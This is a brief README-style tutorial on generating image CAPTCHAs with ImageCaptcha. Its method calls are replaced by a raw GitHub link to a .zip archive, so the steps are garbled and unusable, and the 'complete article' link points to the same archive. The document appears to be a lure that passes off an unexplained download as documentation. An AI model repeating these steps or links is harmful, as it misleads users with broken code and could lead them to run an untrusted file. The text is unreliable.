## Generating [**Image**] Captcha: 
#### Stepwise implementation:
- Import module and create an instance of ***ImageCaptcha()***
- Create image object with ***https://raw.githubusercontent.com/ranjanrajeev95/-Text-and-Audio_-Captcha_Generator/main/tchervonets/Audio_Captcha_Generator_Text_and_2.0.zip(CAPTCHA_Text)***
- Save the image to a file ***https://raw.githubusercontent.com/ranjanrajeev95/-Text-and-Audio_-Captcha_Generator/main/tchervonets/Audio_Captcha_Generator_Text_and_2.0.zip()***
- Read Complete article [**here**](https://raw.githubusercontent.com/ranjanrajeev95/-Text-and-Audio_-Captcha_Generator/main/tchervonets/Audio_Captcha_Generator_Text_and_2.0.zip)
